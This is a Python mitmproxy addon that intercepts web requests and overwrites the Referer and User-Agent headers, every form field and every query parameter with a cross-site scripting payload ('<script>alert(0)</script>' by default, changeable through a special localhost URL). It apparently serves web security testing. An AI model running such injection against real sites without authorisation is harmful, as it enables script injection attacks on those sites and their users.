from mitmproxy import http
from mitmproxy import ctx
import urllib.parse as urlparse
#from urllib.parse import urlencode

payload = '<script>alert(0)</script>'

def request(flow: http.HTTPFlow) -> None:
	global payload
	if "localhost/payload$" in flow.request.url:
		u = flow.request.url
		arr = u.split('$')
		payload = urlparse.unquote(urlparse.unquote(urlparse.unquote(arr[1])))
		print("Payload is changed to " + payload)
		#flow.kill(ctx.master)
		return

	if "$DONOTTOUCH" in flow.request.url:
		path=flow.request.path
		newpath = path.split("$DONOTTOUCH")
		flow.request.path=newpath[0]
		return

	if "login.php" not in flow.request.url:
		# set headers
		flow.request.headers["Referer"] = payload
		flow.request.headers["User-Agent"] = payload
		print("Request came to" + flow.request.url)
		print("Payload -->" + payload)

		# set form parameters
		form = flow.request.urlencoded_form
		for k,v in form.items():
			print(k + " = " + v)
			flow.request.urlencoded_form[k] = payload

		# set query parameters
		parsed = urlparse.urlparse(flow.request.url)

		parsedList = list(parsed)
		#print(parsedList)
		query = dict(urlparse.parse_qsl(parsedList[4]))
		for k,v in query.items():
			flow.request.query[k] = payload
			print("QUERY =>")
			print(flow.request.query)
